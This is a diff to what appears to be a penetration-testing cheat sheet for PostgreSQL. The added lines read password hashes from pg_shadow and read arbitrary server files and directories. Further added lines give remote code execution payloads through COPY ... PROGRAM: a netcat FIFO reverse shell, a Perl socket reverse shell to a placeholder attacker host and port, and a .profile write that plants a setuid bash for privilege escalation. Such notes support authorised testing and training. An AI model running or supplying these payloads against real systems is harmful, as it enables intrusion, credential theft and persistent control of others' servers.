@@ -2633,9 +2633,9 @@ postgres=# \q                        // quit
 <DATABASE>=# \du+                    // list users roles
 <DATABASE>=# SELECT user;            // get current user
 <DATABASE>=# TABLE <TABLE>;          // select table
-<DATABASE>=# SELECT * FROM users;    // select everything from users table
-<DATABASE>=# SHOW rds.extensions;    // list installed extensions
-<DATABASE>=# SELECT usename, passwd from pg_shadow;    // read credentials
+<DATABASE>=# SELECT usename, passwd from pg_shadow;                         // read credentials
+<DATABASE>=# SELECT * FROM pg_ls_dir('/'); --                               // read directories
+<DATABASE>=# SELECT pg_read_file('/PATH/TO/FILE/<FILE>', 0, 1000000); --    // read a file
 ```
 
 ##### Postgres Remote Code Execution
@@ -2646,6 +2646,14 @@ postgres=# \q                        // quit
 <DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';
 <DATABASE>=# SELECT * FROM cmd_exec;
 <DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
+```
+
+or
+
+```c
+<DATABASE>=# COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f';
+<DATABASE>=# COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<LPORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
+<DATABASE>=# COPY (SELECT CAST('cp /bin/bash /var/lib/postgresql/bash;chmod 4777 /var/lib/postgresql/bash;' AS text)) TO '/var/lib/postgresql/.profile';"
 ```
 
 #### Redis
